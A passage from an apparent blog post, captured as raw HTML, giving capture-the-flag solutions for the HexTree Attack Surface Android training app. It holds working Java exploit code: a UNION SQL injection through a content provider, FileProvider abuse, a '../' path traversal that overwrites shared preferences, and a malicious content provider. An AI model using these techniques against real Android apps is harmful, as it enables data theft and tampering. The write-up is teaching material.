+<span class="nt">&lt;/activity&gt;</span>
+</pre></table></code></div></div><div class="language-java highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+</pre><td class="rouge-code"><pre><span class="nc">Intent</span> <span class="n">intent</span> <span class="o">=</span> <span class="n">getIntent</span><span class="o">();</span>
+
+<span class="k">if</span> <span class="o">(</span><span class="n">intent</span><span class="o">.</span><span class="na">getAction</span><span class="o">()</span> <span class="o">!=</span> <span class="kc">null</span><span class="o">){</span>
+<span class="nc">Log</span><span class="o">.</span><span class="na">i</span><span class="o">(</span><span class="s">"QueryFlag33.2"</span><span class="o">,</span> <span class="n">intent</span><span class="o">.</span><span class="na">getAction</span><span class="o">());</span>
+<span class="nc">ContentResolver</span> <span class="n">resolver</span> <span class="o">=</span> <span class="n">getContentResolver</span><span class="o">();</span>
+<span class="nc">Cursor</span> <span class="n">cursor</span> <span class="o">=</span> <span class="n">resolver</span><span class="o">.</span><span class="na">query</span><span class="o">(</span><span class="n">intent</span><span class="o">.</span><span class="na">getData</span><span class="o">(),</span> <span class="kc">null</span><span class="o">,</span> <span class="s">"_id=2 UNION SELECT 1,title,content,'a' FROM Note"</span><span class="o">,</span> <span class="kc">null</span><span class="o">,</span> <span class="kc">null</span><span class="o">);</span>
+
+<span class="k">if</span> <span class="o">(</span><span class="n">cursor</span> <span class="o">!=</span> <span class="kc">null</span><span class="o">)</span> <span class="o">{</span>
+    <span class="nc">String</span><span class="o">[]</span> <span class="n">columnNames</span> <span class="o">=</span> <span class="n">cursor</span><span class="o">.</span><span class="na">getColumnNames</span><span class="o">();</span>
+    <span class="k">while</span> <span class="o">(</span><span class="n">cursor</span><span class="o">.</span><span class="na">moveToNext</span><span class="o">())</span> <span class="o">{</span>
+        <span class="k">for</span> <span class="o">(</span><span class="nc">String</span> <span class="n">columnName</span> <span class="o">:</span> <span class="n">columnNames</span><span class="o">)</span> <span class="o">{</span>
+            <span class="nc">String</span> <span class="n">value</span> <span class="o">=</span> <span class="n">cursor</span><span class="o">.</span><span class="na">getString</span><span class="o">(</span><span class="n">cursor</span><span class="o">.</span><span class="na">getColumnIndexOrThrow</span><span class="o">(</span><span class="n">columnName</span><span class="o">));</span>
+            <span class="nc">Log</span><span class="o">.</span><span class="na">i</span><span class="o">(</span><span class="s">"QueryFlag33.2"</span><span class="o">,</span> <span class="n">columnName</span> <span class="o">+</span> <span class="s">": "</span> <span class="o">+</span> <span class="n">value</span><span class="o">);</span>
+        <span class="o">}</span>
+    <span class="o">}</span>
+    <span class="n">cursor</span><span class="o">.</span><span class="na">close</span><span class="o">();</span>
+<span class="o">}</span>
+<span class="o">}</span>
+</pre></table></code></div></div><h2 id="file-provider"><strong>File Provider</strong></h2><h3 id="flag34"><strong>Flag34</strong></h3><blockquote><p>Simple File Provider</p></blockquote><div class="language-java highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+19
+20
+21
+22
+23
+24
+25
+</pre><td class="rouge-code"><pre><span class="kd">protected</span> <span class="kt">void</span> <span class="nf">onCreate</span><span class="o">(</span><span class="nc">Bundle</span> <span class="n">savedInstanceState</span><span class="o">)</span> <span class="o">{</span>
+<span class="kd">super</span><span class="o">.</span><span class="na">onCreate</span><span class="o">(</span><span class="n">savedInstanceState</span><span class="o">);</span>
+<span class="n">setContentView</span><span class="o">(</span><span class="no">R</span><span class="o">.</span><span class="na">layout</span><span class="o">.</span><span class="na">activity_main</span><span class="o">);</span>
+
+<span class="nc">Intent</span> <span class="n">intent</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">Intent</span><span class="o">();</span>
+<span class="n">intent</span><span class="o">.</span><span class="na">putExtra</span><span class="o">(</span><span class="s">"filename"</span><span class="o">,</span> <span class="s">"flags/flag34.txt"</span><span class="o">);</span>
+<span class="n">intent</span><span class="o">.</span><span class="na">setClassName</span><span class="o">(</span><span class="s">"io.hextree.attacksurface"</span><span class="o">,</span><span class="s">"io.hextree.attacksurface.activities.Flag34Activity"</span><span class="o">);</span>
+<span class="n">startActivityForResult</span><span class="o">(</span><span class="n">intent</span><span class="o">,</span> <span class="mi">42</span><span class="o">);</span>
+<span class="o">}</span>
+
+<span class="kd">protected</span> <span class="kt">void</span> <span class="nf">onActivityResult</span><span class="o">(</span><span class="kt">int</span> <span class="n">requestCode</span><span class="o">,</span> <span class="kt">int</span> <span class="n">resultCode</span><span class="o">,</span> <span class="nc">Intent</span> <span class="n">data</span><span class="o">)</span> <span class="o">{</span>
+<span class="kd">super</span><span class="o">.</span><span class="na">onActivityResult</span><span class="o">(</span><span class="n">requestCode</span><span class="o">,</span> <span class="n">resultCode</span><span class="o">,</span> <span class="n">data</span><span class="o">);</span>
+<span class="nc">Log</span><span class="o">.</span><span class="na">i</span><span class="o">(</span><span class="s">"QueryFlag34"</span><span class="o">,</span> <span class="nc">String</span><span class="o">.</span><span class="na">valueOf</span><span class="o">(</span><span class="n">data</span><span class="o">.</span><span class="na">getData</span><span class="o">()));</span>
+<span class="k">try</span> <span class="o">{</span>
+    <span class="nc">InputStream</span> <span class="n">inputStream</span> <span class="o">=</span> <span class="n">getContentResolver</span><span class="o">().</span><span class="na">openInputStream</span><span class="o">(</span><span class="n">data</span><span class="o">.</span><span class="na">getData</span><span class="o">());</span>
+    <span class="nc">BufferedReader</span> <span class="n">reader</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">BufferedReader</span><span class="o">(</span><span class="k">new</span> <span class="nc">InputStreamReader</span><span class="o">(</span><span class="n">inputStream</span><span class="o">));</span>
+    <span class="nc">String</span> <span class="n">line</span><span class="o">;</span>
+
+    <span class="k">while</span> <span class="o">((</span><span class="n">line</span> <span class="o">=</span> <span class="n">reader</span><span class="o">.</span><span class="na">readLine</span><span class="o">())</span> <span class="o">!=</span> <span class="kc">null</span><span class="o">)</span> <span class="o">{</span>
+        <span class="nc">Log</span><span class="o">.</span><span class="na">i</span><span class="o">(</span><span class="s">"QueryFlagFile34"</span><span class="o">,</span> <span class="n">line</span><span class="o">);</span>
+    <span class="o">}</span>
+<span class="o">}</span>
+<span class="k">catch</span> <span class="o">(</span><span class="nc">IOException</span> <span class="n">e</span><span class="o">){</span>
+<span class="o">}</span>
+<span class="o">}</span>
+</pre></table></code></div></div><h3 id="flag35"><strong>Flag35</strong></h3><blockquote><p>Root-File Provider</p></blockquote><div class="language-java highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+</pre><td class="rouge-code"><pre><span class="nc">String</span> <span class="n">stringExtra</span> <span class="o">=</span> <span class="n">getIntent</span><span class="o">().</span><span class="na">getStringExtra</span><span class="o">(</span><span class="s">"filename"</span><span class="o">);</span>
+<span class="k">if</span> <span class="o">(</span><span class="n">stringExtra</span> <span class="o">!=</span> <span class="kc">null</span><span class="o">)</span> <span class="o">{</span>
+<span class="n">prepareFlag</span><span class="o">(</span><span class="k">this</span><span class="o">,</span> <span class="n">stringExtra</span><span class="o">);</span>
+<span class="nc">Uri</span> <span class="n">uriForFile</span> <span class="o">=</span> <span class="nc">FileProvider</span><span class="o">.</span><span class="na">getUriForFile</span><span class="o">(</span><span class="k">this</span><span class="o">,</span> <span class="s">"io.hextree.root"</span><span class="o">,</span> <span class="k">new</span> <span class="nc">File</span><span class="o">(</span><span class="n">getFilesDir</span><span class="o">(),</span> <span class="n">stringExtra</span><span class="o">));</span>
+<span class="nc">Intent</span> <span class="n">intent</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">Intent</span><span class="o">();</span>
+<span class="n">intent</span><span class="o">.</span><span class="na">setData</span><span class="o">(</span><span class="n">uriForFile</span><span class="o">);</span>
+<span class="n">intent</span><span class="o">.</span><span class="na">addFlags</span><span class="o">(</span><span class="mi">3</span><span class="o">);</span>
+<span class="o">**</span><span class="n">setResult</span><span class="o">(</span><span class="mi">0</span><span class="o">,</span> <span class="n">intent</span><span class="o">);**</span>
+<span class="k">return</span><span class="o">;</span>
+<span class="o">}</span>
+<span class="c1">// Returns the absolute path to the directory on the filesystem where files created</span>
+<span class="nc">Uri</span> <span class="n">uriForFile2</span> <span class="o">=</span> <span class="nc">FileProvider</span><span class="o">.</span><span class="na">getUriForFile</span><span class="o">(</span><span class="k">this</span><span class="o">,</span> <span class="s">"io.hextree.files"</span><span class="o">,</span> <span class="k">new</span> <span class="nc">File</span><span class="o">(</span><span class="n">getFilesDir</span><span class="o">(),</span> <span class="s">"secret.txt"</span><span class="o">));</span>
+<span class="nc">Intent</span> <span class="n">intent2</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">Intent</span><span class="o">();</span>
+<span class="n">intent2</span><span class="o">.</span><span class="na">setData</span><span class="o">(</span><span class="n">uriForFile2</span><span class="o">);</span>
+<span class="n">intent2</span><span class="o">.</span><span class="na">addFlags</span><span class="o">(</span><span class="mi">3</span><span class="o">);</span>
+<span class="o">**</span><span class="n">setResult</span><span class="o">(-</span><span class="mi">1</span><span class="o">,</span> <span class="n">intent2</span><span class="o">);**</span>
+<span class="o">}</span>
+</pre></table></code></div></div><h3 id="flag36"><strong>Flag36</strong></h3><blockquote><p>Overwriting Shared Prefs</p></blockquote><div class="language-java highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+19
+20
+21
+22
+23
+24
+25
+26
+27
+28
+29
+30
+31
+32
+33
+34
+35
+36
+37
+38
+39
+40
+41
+42
+</pre><td class="rouge-code"><pre><span class="kd">public</span> <span class="kd">class</span> <span class="nc">MainActivity</span> <span class="kd">extends</span> <span class="nc">AppCompatActivity</span> <span class="o">{</span>
+
+<span class="nd">@Override</span>
+<span class="kd">protected</span> <span class="kt">void</span> <span class="nf">onCreate</span><span class="o">(</span><span class="nc">Bundle</span> <span class="n">savedInstanceState</span><span class="o">)</span> <span class="o">{</span>
+  <span class="kd">super</span><span class="o">.</span><span class="na">onCreate</span><span class="o">(</span><span class="n">savedInstanceState</span><span class="o">);</span>
+  <span class="n">setContentView</span><span class="o">(</span><span class="no">R</span><span class="o">.</span><span class="na">layout</span><span class="o">.</span><span class="na">activity_main</span><span class="o">);</span>
+
+  <span class="nc">Intent</span> <span class="n">intent</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">Intent</span><span class="o">();</span>
+  <span class="o">**</span><span class="n">intent</span><span class="o">.</span><span class="na">putExtra</span><span class="o">(</span><span class="s">"filename"</span><span class="o">,</span> <span class="s">"../shared_prefs/Flag36Preferences.xml"</span><span class="o">);**</span>
+  <span class="n">intent</span><span class="o">.</span><span class="na">setClassName</span><span class="o">(</span><span class="s">"io.hextree.attacksurface"</span><span class="o">,</span><span class="s">"io.hextree.attacksurface.activities.Flag35Activity"</span><span class="o">);</span>
+  <span class="n">startActivityForResult</span><span class="o">(</span><span class="n">intent</span><span class="o">,</span> <span class="mi">42</span><span class="o">);</span>
+<span class="o">}</span>
+
+<span class="kd">protected</span> <span class="kt">void</span> <span class="nf">onActivityResult</span><span class="o">(</span><span class="kt">int</span> <span class="n">requestCode</span><span class="o">,</span> <span class="kt">int</span> <span class="n">resultCode</span><span class="o">,</span> <span class="nc">Intent</span> <span class="n">data</span><span class="o">)</span> <span class="o">{</span>
+  <span class="kd">super</span><span class="o">.</span><span class="na">onActivityResult</span><span class="o">(</span><span class="n">requestCode</span><span class="o">,</span> <span class="n">resultCode</span><span class="o">,</span> <span class="n">data</span><span class="o">);</span>
+  <span class="nc">Log</span><span class="o">.</span><span class="na">i</span><span class="o">(</span><span class="s">"QueryFlag36"</span><span class="o">,</span> <span class="nc">String</span><span class="o">.</span><span class="na">valueOf</span><span class="o">(</span><span class="n">data</span><span class="o">.</span><span class="na">getData</span><span class="o">()));</span>
+  <span class="k">try</span> <span class="o">{</span>
+      <span class="c1">// Read the existing XML file</span>
+      <span class="nc">InputStream</span> <span class="n">inputStream</span> <span class="o">=</span> <span class="n">getContentResolver</span><span class="o">().</span><span class="na">openInputStream</span><span class="o">(</span><span class="n">data</span><span class="o">.</span><span class="na">getData</span><span class="o">());</span>
+      <span class="nc">StringBuilder</span> <span class="n">stringBuilder</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">StringBuilder</span><span class="o">();</span>
+      <span class="nc">BufferedReader</span> <span class="n">reader</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">BufferedReader</span><span class="o">(</span><span class="k">new</span> <span class="nc">InputStreamReader</span><span class="o">(</span><span class="n">inputStream</span><span class="o">));</span>
+      <span class="nc">String</span> <span class="n">line</span><span class="o">;</span>
+
+      <span class="o">**</span><span class="k">while</span> <span class="o">((</span><span class="n">line</span> <span class="o">=</span> <span class="n">reader</span><span class="o">.</span><span class="na">readLine</span><span class="o">())</span> <span class="o">!=</span> <span class="kc">null</span><span class="o">)</span> <span class="o">{</span>
+          <span class="c1">// Replace false with true</span>
+          <span class="n">line</span> <span class="o">=</span> <span class="n">line</span><span class="o">.</span><span class="na">replaceAll</span><span class="o">(</span><span class="s">"false"</span><span class="o">,</span> <span class="s">"true"</span><span class="o">);</span>
+          <span class="n">stringBuilder</span><span class="o">.</span><span class="na">append</span><span class="o">(</span><span class="n">line</span><span class="o">).</span><span class="na">append</span><span class="o">(</span><span class="s">"\n"</span><span class="o">);</span>
+      <span class="o">}</span>
+      <span class="n">reader</span><span class="o">.</span><span class="na">close</span><span class="o">();</span>
+
+      <span class="c1">// Write the modified content back to the file</span>
+      <span class="nc">OutputStream</span> <span class="n">outputStream</span> <span class="o">=</span> <span class="n">getContentResolver</span><span class="o">().</span><span class="na">openOutputStream</span><span class="o">(</span><span class="n">data</span><span class="o">.</span><span class="na">getData</span><span class="o">());</span>
+      <span class="n">outputStream</span><span class="o">.</span><span class="na">write</span><span class="o">(</span><span class="n">stringBuilder</span><span class="o">.</span><span class="na">toString</span><span class="o">().</span><span class="na">getBytes</span><span class="o">());</span>
+      <span class="n">outputStream</span><span class="o">.</span><span class="na">close</span><span class="o">();**</span>
+	  <span class="c1">// restart the app to take effect</span>
+      <span class="nc">Intent</span> <span class="n">openFlag36Activity</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">Intent</span><span class="o">();</span>
+      <span class="n">openFlag36Activity</span><span class="o">.</span><span class="na">setClassName</span><span class="o">(</span><span class="s">"io.hextree.attacksurface"</span><span class="o">,</span><span class="s">"io.hextree.attacksurface.activities.Flag36Activity"</span><span class="o">);</span>
+      <span class="n">startActivity</span><span class="o">(</span><span class="n">openFlag36Activity</span><span class="o">);</span>
+  <span class="o">}</span>
+  <span class="k">catch</span> <span class="o">(</span><span class="nc">IOException</span> <span class="n">e</span><span class="o">){</span>
+  <span class="o">}</span>
+<span class="o">}}</span>
+</pre></table></code></div></div><h3 id="flag37"><strong>Flag37</strong></h3><blockquote><p>File Provider Receivers</p></blockquote><p>MainActiivty</p><div class="language-java highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+</pre><td class="rouge-code"><pre><span class="nc">Intent</span> <span class="n">intent</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">Intent</span><span class="o">();</span>
+<span class="nc">Uri</span> <span class="nc">FileProvider</span> <span class="o">=</span> <span class="nc">Uri</span><span class="o">.</span><span class="na">parse</span><span class="o">(</span><span class="s">"content://ItsFadinG.github.io"</span><span class="o">);</span>
+<span class="n">intent</span><span class="o">.</span><span class="na">setData</span><span class="o">(</span><span class="nc">FileProvider</span><span class="o">);</span>
+<span class="n">intent</span><span class="o">.</span><span class="na">setClassName</span><span class="o">(</span><span class="s">"io.hextree.attacksurface"</span><span class="o">,</span><span class="s">"io.hextree.attacksurface.activities.Flag37Activity"</span><span class="o">);</span>
+<span class="n">startActivity</span><span class="o">(</span><span class="n">intent</span><span class="o">);</span>
+</pre></table></code></div></div><p>Provider XML</p><div class="language-xml highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+</pre><td class="rouge-code"><pre><span class="nt">&lt;provider</span>
+<span class="na">android:name=</span><span class="s">".AttackProvider"</span>
+<span class="na">android:authorities=</span><span class="s">"ItsFadinG.github.io"</span>
+<span class="na">android:enabled=</span><span class="s">"true"</span>
+<span class="na">android:exported=</span><span class="s">"true"</span><span class="nt">&gt;</span>
+<span class="nt">&lt;/provider&gt;</span>
+</pre></table></code></div></div><p>Attack Provider Code</p><div class="language-java highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+19
+20
+21
+22
+23
+24
+25
+26
+27
+28
+29
+30
+31
+32
+33
+34
+35
+36
+37
+38
+39
+40
+41
+42
+43
+44
+45
+46
+47
+48
+49
+50
+51
+52
+53
+54
+55
+56
+57
+58
+59
+60
+61
+62
+63
+64
+65
+66
+67
+68
+69
+70
+71
+72
+</pre><td class="rouge-code"><pre><span class="kd">public</span> <span class="kd">class</span> <span class="nc">AttackProvider</span> <span class="kd">extends</span> <span class="nc">ContentProvider</span> <span class="o">{</span>
+<span class="kd">public</span> <span class="nf">AttackProvider</span><span class="o">()</span> <span class="o">{</span>
+<span class="o">}</span>
+
+<span class="nd">@Override</span>
+<span class="kd">public</span> <span class="nc">Cursor</span> <span class="nf">query</span><span class="o">(</span><span class="nc">Uri</span> <span class="n">uri</span><span class="o">,</span> <span class="nc">String</span><span class="o">[]</span> <span class="n">projection</span><span class="o">,</span> <span class="nc">String</span> <span class="n">selection</span><span class="o">,</span> <span class="nc">String</span><span class="o">[]</span> <span class="n">selectionArgs</span><span class="o">,</span> <span class="nc">String</span> <span class="n">sortOrder</span><span class="o">)</span> <span class="o">{</span>
+  <span class="nc">Log</span><span class="o">.</span><span class="na">i</span><span class="o">(</span><span class="s">"AttackProvider"</span><span class="o">,</span> <span class="s">"query("</span><span class="o">+</span><span class="n">uri</span><span class="o">.</span><span class="na">toString</span><span class="o">()+</span><span class="s">")"</span><span class="o">);</span>
+
+  <span class="nc">MatrixCursor</span> <span class="n">cursor</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">MatrixCursor</span><span class="o">(</span><span class="k">new</span> <span class="nc">String</span><span class="o">[]{</span>
+          <span class="nc">OpenableColumns</span><span class="o">.</span><span class="na">DISPLAY_NAME</span><span class="o">,</span> <span class="nc">OpenableColumns</span><span class="o">.</span><span class="na">SIZE</span>
+  <span class="o">});</span>
+
+  <span class="n">cursor</span><span class="o">.</span><span class="na">addRow</span><span class="o">(</span><span class="k">new</span> <span class="nc">Object</span><span class="o">[]{</span>
+          <span class="s">"../flag37.txt"</span><span class="o">,</span> <span class="mi">1337</span>
+  <span class="o">});</span>
+
+  <span class="k">return</span> <span class="n">cursor</span><span class="o">;</span>
+<span class="o">}</span>
+<span class="nd">@Override</span>
+<span class="kd">public</span> <span class="nc">ParcelFileDescriptor</span> <span class="nf">openFile</span><span class="o">(</span><span class="nc">Uri</span> <span class="n">uri</span><span class="o">,</span> <span class="nd">@NonNull</span> <span class="nc">String</span> <span class="n">mode</span><span class="o">)</span> <span class="kd">throws</span> <span class="nc">FileNotFoundException</span> <span class="o">{</span>
+  <span class="nc">Log</span><span class="o">.</span><span class="na">i</span><span class="o">(</span><span class="s">"AttackProvider"</span><span class="o">,</span> <span class="s">"openFile("</span> <span class="o">+</span> <span class="n">uri</span><span class="o">.</span><span class="na">toString</span><span class="o">()</span> <span class="o">+</span> <span class="s">")"</span><span class="o">);</span>
+
+  <span class="k">try</span> <span class="o">{</span>
+      <span class="nc">ParcelFileDescriptor</span><span class="o">[]</span> <span class="n">pipe</span> <span class="o">=</span> <span class="nc">ParcelFileDescriptor</span><span class="o">.</span><span class="na">createPipe</span><span class="o">();</span>
+      <span class="nc">ParcelFileDescriptor</span><span class="o">.</span><span class="na">AutoCloseOutputStream</span> <span class="n">outputStream</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">ParcelFileDescriptor</span><span class="o">.</span><span class="na">AutoCloseOutputStream</span><span class="o">(</span><span class="n">pipe</span><span class="o">[</span><span class="mi">1</span><span class="o">]);</span>
+
+      <span class="k">new</span> <span class="nf">Thread</span><span class="o">(()</span> <span class="o">-&gt;</span> <span class="o">{</span>
+          <span class="k">try</span> <span class="o">{</span>
+              <span class="n">outputStream</span><span class="o">.</span><span class="na">write</span><span class="o">(</span><span class="s">"give flag"</span><span class="o">.</span><span class="na">getBytes</span><span class="o">());</span>
+              <span class="n">outputStream</span><span class="o">.</span><span class="na">close</span><span class="o">();</span>
+          <span class="o">}</span> <span class="k">catch</span> <span class="o">(</span><span class="nc">IOException</span> <span class="n">e</span><span class="o">)</span> <span class="o">{</span>
+              <span class="nc">Log</span><span class="o">.</span><span class="na">e</span><span class="o">(</span><span class="s">"AttackProvider"</span><span class="o">,</span> <span class="s">"Error in pipeToParcelFileDescriptor"</span><span class="o">,</span> <span class="n">e</span><span class="o">);</span>
+          <span class="o">}</span>
+      <span class="o">}).</span><span class="na">start</span><span class="o">();</span>
+
+      <span class="k">return</span> <span class="n">pipe</span><span class="o">[</span><span class="mi">0</span><span class="o">];</span>
+  <span class="o">}</span> <span class="k">catch</span> <span class="o">(</span><span class="nc">IOException</span> <span class="n">e</span><span class="o">)</span> <span class="o">{</span>
+      <span class="k">throw</span> <span class="k">new</span> <span class="nf">FileNotFoundException</span><span class="o">(</span><span class="s">"Could not open pipe for: "</span> <span class="o">+</span> <span class="n">uri</span><span class="o">.</span><span class="na">toString</span><span class="o">());</span>
+  <span class="o">}</span>
+<span class="o">}</span>
+
+<span class="nd">@Override</span>
+<span class="kd">public</span> <span class="kt">int</span> <span class="nf">delete</span><span class="o">(</span><span class="nc">Uri</span> <span class="n">uri</span><span class="o">,</span> <span class="nc">String</span> <span class="n">selection</span><span class="o">,</span> <span class="nc">String</span><span class="o">[]</span> <span class="n">selectionArgs</span><span class="o">)</span> <span class="o">{</span>
+    <span class="nc">Log</span><span class="o">.</span><span class="na">i</span><span class="o">(</span><span class="s">"AttackProvider"</span><span class="o">,</span> <span class="s">"delete("</span><span class="o">+</span><span class="n">uri</span><span class="o">.</span><span class="na">toString</span><span class="o">()+</span><span class="s">")"</span><span class="o">);</span>
+    <span class="k">throw</span> <span class="k">new</span> <span class="nf">UnsupportedOperationException</span><span class="o">(</span><span class="s">"Not yet implemented"</span><span class="o">);</span>
+<span class="o">}</span>
+
+<span class="nd">@Override</span>
+<span class="kd">public</span> <span class="nc">String</span> <span class="nf">getType</span><span class="o">(</span><span class="nc">Uri</span> <span class="n">uri</span><span class="o">)</span> <span class="o">{</span>
+    <span class="nc">Log</span><span class="o">.</span><span class="na">i</span><span class="o">(</span><span class="s">"AttackProvider"</span><span class="o">,</span> <span class="s">"getType("</span><span class="o">+</span><span class="n">uri</span><span class="o">.</span><span class="na">toString</span><span class="o">()+</span><span class="s">")"</span><span class="o">);</span>
+    <span class="k">throw</span> <span class="k">new</span> <span class="nf">UnsupportedOperationException</span><span class="o">(</span><span class="s">"Not yet implemented"</span><span class="o">);</span>
+<span class="o">}</span>
+
+<span class="nd">@Override</span>
+<span class="kd">public</span> <span class="nc">Uri</span> <span class="nf">insert</span><span class="o">(</span><span class="nc">Uri</span> <span class="n">uri</span><span class="o">,</span> <span class="nc">ContentValues</span> <span class="n">values</span><span class="o">)</span> <span class="o">{</span>
+    <span class="nc">Log</span><span class="o">.</span><span class="na">i</span><span class="o">(</span><span class="s">"AttackProvider"</span><span class="o">,</span> <span class="s">"insert("</span><span class="o">+</span><span class="n">uri</span><span class="o">.</span><span class="na">toString</span><span class="o">()+</span><span class="s">")"</span><span class="o">);</span>
+    <span class="k">throw</span> <span class="k">new</span> <span class="nf">UnsupportedOperationException</span><span class="o">(</span><span class="s">"Not yet implemented"</span><span class="o">);</span>
+<span class="o">}</span>
+
+<span class="nd">@Override</span>
+<span class="kd">public</span> <span class="kt">boolean</span> <span class="nf">onCreate</span><span class="o">()</span> <span class="o">{</span>
+    <span class="nc">Log</span><span class="o">.</span><span class="na">i</span><span class="o">(</span><span class="s">"AttackProvider"</span><span class="o">,</span> <span class="s">"onCreate()"</span><span class="o">);</span>
+    <span class="k">return</span> <span class="kc">true</span><span class="o">;</span>
+<span class="o">}</span>
+
+<span class="nd">@Override</span>
+<span class="kd">public</span> <span class="kt">int</span> <span class="nf">update</span><span class="o">(</span><span class="nc">Uri</span> <span class="n">uri</span><span class="o">,</span> <span class="nc">ContentValues</span> <span class="n">values</span><span class="o">,</span> <span class="nc">String</span> <span class="n">selection</span><span class="o">,</span>
+                  <span class="nc">String</span><span class="o">[]</span> <span class="n">selectionArgs</span><span class="o">)</span> <span class="o">{</span>
+    <span class="nc">Log</span><span class="o">.</span><span class="na">i</span><span class="o">(</span><span class="s">"AttackProvider"</span><span class="o">,</span> <span class="s">"update("</span><span class="o">+</span><span class="n">uri</span><span class="o">.</span><span class="na">toString</span><span class="o">()+</span><span class="s">")"</span><span class="o">);</span>
+    <span class="k">throw</span> <span class="k">new</span> <span class="nf">UnsupportedOperationException</span><span class="o">(</span><span class="s">"Not yet implemented"</span><span class="o">);</span>
+<span class="o">}</span>
+<span class="o">}</span>
+</pre></table></code></div></div><h2 id="conclusion"><strong>Conclusion</strong></h2><p>I will be happy to hear your thoughts and feedback. Also, let me know if you need a detailed explanation for any of these challenges. PEACE!</p></div><div class="post-tail-wrapper text-muted"><div class="post-meta mb-3"> <i class="far fa-folder-open fa-fw mr-1"></i> <a href='/categories/android-security/'>Android Security</a></div><div class="post-tags"> <i class="fa fa-tags fa-fw mr-1"></i> <a href="/tags/android-security/" class="post-tag no-text-decoration" >android security</a> <a href="/tags/writeups/" class="post-tag no-text-decoration" >writeups</a></div><div class="post-tail-bottom d-flex justify-content-between align-items-center mt-3 pt-5 pb-2"><div class="license-wrapper"> This post is licensed under <a href="https://creativecommons.org/licenses/by/4.0/">CC BY 4.0</a> by the author.</div><div class="share-wrapper"> <span class="share-label text-muted mr-1">Share</span> <span class="share-icons"> <a href="https://twitter.com/intent/tweet?text=HexTree Attack Surface Android App Solutions - Muhammad Adel&url=https://itsfading.github.io/posts/HexTree-Attack-Surface-App-Solutions/" data-toggle="tooltip" data-placement="top" title="Twitter" target="_blank" rel="noopener" aria-label="Twitter"> <i class="fa-fw fab fa-twitter"></i> </a> <a href="https://www.facebook.com/sharer/sharer.php?title=HexTree Attack Surface Android App Solutions - Muhammad Adel&u=https://itsfading.github.io/posts/HexTree-Attack-Surface-App-Solutions/" data-toggle="tooltip" data-placement="top" title="Facebook" target="_blank" rel="noopener" aria-label="Facebook"> <i class="fa-fw fab fa-facebook-square"></i> </a> <a href="https://telegram.me/share?text=HexTree Attack Surface Android App Solutions - Muhammad Adel&url=https://itsfading.github.io/posts/HexTree-Attack-Surface-App-Solutions/" data-toggle="tooltip" data-placement="top" title="Telegram" target="_blank" rel="noopener" aria-label="Telegram"> <i class="fa-fw fab fa-telegram"></i> </a> <i class="fa-fw fas fa-link small" onclick="copyLink()" data-toggle="tooltip" data-placement="top" title="Copy link"></i> </span></div></div></div></div></div><div id="panel-wrapper" class="col-xl-3 pl-2 text-muted topbar-down"><div class="access"><div id="access-lastmod" class="post"> <span>Recent Update</span><ul class="post-content pl-0 pb-1 ml-1 mt-2"><li><a href="/posts/CRTP-Commands-CheatSheet/">CRTP Commands CheatSheet</a><li><a href="/posts/Active-Directory-Authentication/">Active Directory Authentication</a><li><a href="/posts/Mobile-Hacking-Lab-IOS-Challenges-Writeups/">MobileHackingLab IOS Challenges Writeups</a><li><a href="/posts/Active-Directory-Basics/">Active Directory Basics</a><li><a href="/posts/Cybertalents-Shadower-Machine-Writeup/">Cybertalents Shadower Machine Writeup</a></ul></div><div id="access-tags"> <span>Trending Tags</span><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/tags/ctf/">ctf</a> <a class="post-tag" href="/tags/web/">web</a> <a class="post-tag" href="/tags/cybertalents/">cybertalents</a> <a class="post-tag" href="/tags/writeups/">writeups</a> <a class="post-tag" href="/tags/active-directory/">active directory</a> <a class="post-tag" href="/tags/redteaming/">redteaming</a> <a class="post-tag" href="/tags/android-security/">android security</a> <a class="post-tag" href="/tags/bug-hunting/">bug hunting</a> <a class="post-tag" href="/tags/machines/">machines</a> <a class="post-tag" href="/tags/android-security/">Android Security</a></div></div></div><script src="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.js"></script><div id="toc-wrapper" class="pl-0 pr-4 mb-5"> <span class="pl-3 pt-2 mb-2">Contents</span><nav id="toc" data-toggle="toc"></nav></div></div></div><div class="row"><div class="col-12 col-lg-11 col-xl-8"><div id="post-extend-wrapper" class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"><div id="related-posts" class="mt-5 mb-2 mb-sm-4"><h3 class="pt-2 mt-1 mb-4 ml-1" data-toc-skip>Further Reading</h3><div class="card-deck mb-4"><div class="card"> <a href="/posts/Hackerone-Android-challenges-Writeup/"><div class="card-body"> <span class="timeago small" > Mar 7, 2022 <i 